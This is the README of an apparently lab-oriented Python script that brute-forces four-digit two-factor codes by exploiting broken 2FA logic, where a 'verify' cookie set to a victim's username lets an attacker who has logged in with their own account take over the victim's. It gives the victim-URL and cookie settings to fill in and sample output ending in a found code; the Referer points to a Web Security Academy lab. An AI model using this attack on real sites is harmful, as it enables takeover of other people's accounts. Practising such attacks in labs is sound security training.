# 2fa-brute-force-broken-logic

This script is designed to exploit a flawed logic in two-factor authentication (2FA). In the first login step, the system generates a session cookie related to the user before proceeding to the second step. When submitting the verification code, the request uses this cookie to determine which account the user is trying to access. An attacker could potentially log in using their own credentials and then manipulate the account cookie value to any arbitrary username when submitting the verification code.
You'll need to have Python 3 installed on your machine to run the script. 

The 2FA code is a 4-digit number generated within the range of 0000 to 9999 and passed to `try_login` function.

You need to update the global variable `url` with the victim's website URL, as well as the `Host` and `Cookie` parameters in the `headers`variable of the request.

```bash
url = "https://victim.site/login-mfa-checker"
headers = {
    "Host": "victim.site",
    "Cookie": "verify=victim-username; session=ZhugKKwGb7WkNjG5GnDwjirYXSKnpAHN",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Referer": "https://0a32008a03e6370c83a141b3005f0065.web-security-academy.net/login2",
}
```

## Output Example

```python
Attempt with code 5854 - Status Code: 200
Attempt with code 5893 - Status Code: 200
Attempt with code 5855 - Status Code: 200
...
...
Attempt with code 6124 - Status Code: 302
Successful login with code: 6124
Valid code found: 6124
```
